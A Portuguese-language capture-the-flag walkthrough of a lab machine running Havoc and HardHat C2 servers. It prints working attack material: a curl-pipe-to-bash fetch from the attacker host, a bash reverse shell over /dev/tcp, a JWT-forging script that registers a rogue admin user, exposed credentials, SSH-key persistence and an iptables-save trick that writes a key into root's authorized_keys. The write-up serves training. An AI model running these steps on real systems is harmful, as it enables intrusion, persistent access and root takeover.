# Info
#Difficult : Medium
#Tools : Nmap, nc, Python3
#IP_Alvo : 10.10.11.49
#IP_Atacante : 10.10.15.28
***
# Port Scanning
Com sempre começo escaneando o host para ter uma noção dos serviços rodando na máquina alvo.
```sh
nmap 10.10.11.49 -Pn -sC -sV -A -oN nmap_output
```
![[Pasted image 20250325080228.png]]
Algumas portas estão abertas com `22`, `443`, `5000` e `8000`, mas a que me interessou foi a `8000`, no qual o Nmap identificou dois arquivos. Podemos abrir essa porta para dar uma olhada.

Podemos baixar esses dois arquivos e olharmos eles.
![[Pasted image 20250325080749.png]]

Após uma pesquisa sobre o nome do arquivo `havoc.yaotl`, descubro que ele é um arquivo de configuração do Framework de pos-exploração Havoc.
```sh
cat havoc.yaotl
```
![[Pasted image 20250325081122.png]]

No arquivo temos algumas credenciais expostas. Então pesquisei para verificar se havia alguma CVE já conhecida. Nesse caso havia a ``CVE-2024-41570`` de um ``SSRF`` que leva a um ``RCE``.
![[Pasted image 20250325113117.png]]

Podemos também adicionar `backfire.htb` no nosso arquivo de hosts.
```sh
echo "10.10.11.49    backfire.htb" >> /etc/hosts
```

> [!info] Análise
>Reserve um tempo para ler a análise do [Post](https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/) sobre a vulnerabilidade.

***
# RCE
Então busquei algum exploit, e escolhi o primeiro que apareceu.
![[Pasted image 20250325082608.png]]
Exploit : https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE?tab=readme-ov-file

Podemos clona-lo e instalar suas dependências.
```sh
git clone https://github.com/thisisveryfunny/CVE-2024-41570-Havoc-C2-RCE?tab=readme-ov-file
cd CVE-2024-41570-Havoc-C2-RCE
pip3 install -r requirements.txt
```
#### Modificando o exploit
Temos que modificar o`exploit.py` para as configurações que achamos. `port` e `host`, são os que estão no ``Listeners{...}``.
**exploit.py**
```python 
212  USER = "sergej" # CHANGE THIS
213  PASSWORD = "1w4nt2sw1tch2h4rdh4tc2" # CHANGE THIS
214  host = "backfire.htb" # CHANGE THIS
215  port = 8443 # CHANGE THIS
232  cmd = "curl http://10.10.15.28:8000/payload.sh | bash" # CHANGE THE IP AND THE PORT
```

No `payload.sh` devemos colocar algum comando que queremos executar.
**payload.sh**
```sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.15.28/4545 0>&1 # CHANGE THIS
```
#### Executando
Primeiro temos que colocar um `listener` como o ``nc`` ou o `netcat` para ouvir a porta na qual vamos receber a `shell`. Como definido no `payload.sh`.
```sh
nc -lvnp 4545
```

Depois devemos servir nossa payload na porta que definimos no `exploit.py`.
```sh
python -m http.server -p 8000
```

E então podemos executar nosso exploit. o `ip` e a `port` devem ser os que estão no `Teamserver{...}`. E o `target` deve ser o `ip` da máquina.
```
python3 ./exploit.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056
```

![[Pasted image 20250325092251.png]]
**E estamos dentro !!!**

Podemos então pegar a flag de usuário.
![[Pasted image 20250325104219.png]]
***
# Permanência
Há um script que nos desconecta após um tempo, então devemos achar um jeito de nos conectar de forma estável. O mais comum é colocarmos nossa `public_key` no arquivo `~/.ssh/authorized_keys`, que é o que vamos fazer.

Na nossa máquina geramos uma nova chave.
```sh
ssh-keygen -t ed25519 -b 2048 -f backfire.key
```

E então podemos colocar nossa chave pública no alvo.
```sh
echo "<YOUR_PUBLIC_KEY>"  >> ~/.ssh/authorized_keys
```

E agora fazer conexão via ``ssh``.
```sh
ssh ilya@10.10.11.49 -i ./backfire.key
```
![[Pasted image 20250325092543.png]]
***
# Lateral Movement
Ao tentar executar `sudo -l`, é exigido uma senha, tentei as dos arquivos de configuração, mas não é nenhuma delas.
```
sudo -l
```
![[Pasted image 20250325093443.png]]

Então listei as portas internas que estavam sendo escutadas.
```
netstat -ntlp
```
![[Pasted image 20250325093647.png]]

Há duas portas que não temos acesso do nosso host, `7096` e `5000`. Então podemos fazer ``Port Forward`` para essas duas portas para olharmos.
```sh
ssh ilya@10.10.11.49 -i ./backfire.key -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000
```

Então podemos acessar essas portas na nossa máquina local.
![[Pasted image 20250325094729.png]]

O hardhat c2 é um ``Framework C2`` para ``Red Teams``, após uma breve pesquisa, achei um post sobre algumas vulnerabilidades conhecidas. 
![[Pasted image 20250325095500.png]]

>[!info]
>Separe um tempo para ler esse [Post](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7), ele apresenta muita coisa legal.

O script fornecido irá criar um novo usuário `sth_pentest` com a senha `sth_pentest` e  com a função de ``Team Lead``. A porta ``5000`` é utilizada pelo script, então foi útil termos mandado ela também.

**harhatc2_exploit.py**
```python
# @author Siam Thanat Hack Co., Ltd. (STH)
import jwt
import datetime
import uuid
import requests
 
rhost = '127.0.0.1:5000'
 
# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()
 
expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",  
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}
 
token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)
 
# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json"
}
burp0_json = {
  "password": "sth_pentest",
  "role": "TeamLead",
  "username": "sth_pentest"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

Podemos então executar o script e fazer login no sistema.
```sh
python3 ./hardhatc2_exploit.py
```
![[Pasted image 20250325100245.png]]

Agora no menu vamos em `ImplantInteract` e `Terminal`. Aqui podemos executar comando no sistema então podemos seguir a mesma estratégia de escrever nossa `public key` no arquivo `~/.ssh/authorized_keys`.

Enviei primeiro o comando `id` para ver em qual usuários executa.
![[Pasted image 20250325100910.png]]

Então podemos inserir nossa chave.
```sh
echo "<YOUR_PUBLIC_KEY>" > ~/.ssh/authorized_keys
```

Agora entramos com o usuário ``sergej``
![[Pasted image 20250325101351.png]]
***
# Priv Esc
Agora podemos tentar listar os comando que podemos executar com `sudo`.
```sh
sudo -l
```
![[Pasted image 20250325101724.png]]

Podemos executar 2 comandos como `root`, ``iptables`` e ``iptables-save``. Novamente podemos pesquisar sobre eles para achar formas de escalar privilégio.
![[Pasted image 20250325102156.png]]

>[!info]
>Reserve um tempo para ler o [Post](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/) sobre o assunto.

Aqui podemos comentar um comando como o ``iptables`` e salva-lo em qualquer arquivo. Aqui vou  adicionar nossa `public key` no arquivo `/root/.ssh/authorized_keys`. 
```sh
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<YOUR_PUBLIC_KEY>\n'

sudo /usr/sbin/iptables -S

sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

Após ter adicionado, podemos fazer ``ssh`` para a conta de ``root`` e pegar a flag de `root`.
![[Pasted image 20250325103629.png]]
**Owned !!!**

***
![[Pasted image 20250325104558.png]]